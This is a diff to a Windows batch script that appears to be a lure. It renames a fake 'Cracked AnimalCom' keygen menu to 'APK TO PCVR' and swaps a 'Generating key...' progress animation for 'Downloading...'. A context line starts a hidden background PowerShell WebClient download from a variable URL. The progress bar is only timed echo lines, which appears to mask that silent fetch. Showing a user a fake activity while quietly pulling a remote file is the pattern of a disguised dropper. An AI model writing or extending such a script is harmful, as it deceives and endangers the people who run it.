@@ -1,7 +1,7 @@
 @echo off
 cls
 chcp 65001 >nul
-title Cra  cked AnimalCom
+title APK TO PCVR
 color 3
 
 :menu
@@ -11,7 +11,7 @@ echo ┗┛┛ ┗┻┗┛┗┗ ┗┻  ┗┛┗┫  ┗┛┗┛┗┛┗┗
 echo                   ┛                  
 echo.
 echo ┌────────────────────────────┐
-echo │ 1. KeyGen & Download       │
+echo │ 1. Download                │
 echo │                            │
 echo │ 2. exit                    │
 echo └────────────────────────────┘
@@ -40,40 +40,40 @@ start /b powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%u
 
 REM Advanced
 cls
-echo Generating key... [▓▓▓▓▓▓▓▓▓▓▓▓▓]
+echo Downloading... [▓▓▓▓▓▓▓▓▓▓▓▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [█▓▓▓▓▓▓▓▓▓▓▓▓]
+echo Downloading... [█▓▓▓▓▓▓▓▓▓▓▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [██▓▓▓▓▓▓▓▓▓▓▓]
+echo Downloading... [██▓▓▓▓▓▓▓▓▓▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [███▓▓▓▓▓▓▓▓▓▓]
+echo Downloading... [███▓▓▓▓▓▓▓▓▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [████▓▓▓▓▓▓▓▓▓]
+echo Downloading... [████▓▓▓▓▓▓▓▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [██████▓▓▓▓▓▓▓]
+echo Downloading... [██████▓▓▓▓▓▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [███████▓▓▓▓▓▓]
+echo Downloading... [███████▓▓▓▓▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [████████▓▓▓▓▓]
+echo Downloading... [████████▓▓▓▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [█████████▓▓▓▓]
+echo Downloading... [█████████▓▓▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [███████████▓▓]
+echo Downloading... [███████████▓▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [████████████▓]
+echo Downloading... [████████████▓]
 timeout /t 1 /nobreak >nul
 cls
-echo Generating key... [█████████████]
+echo Downloading... [█████████████]
 timeout /t 1 /nobreak >nul
 cls
 echo !Done generating the key!
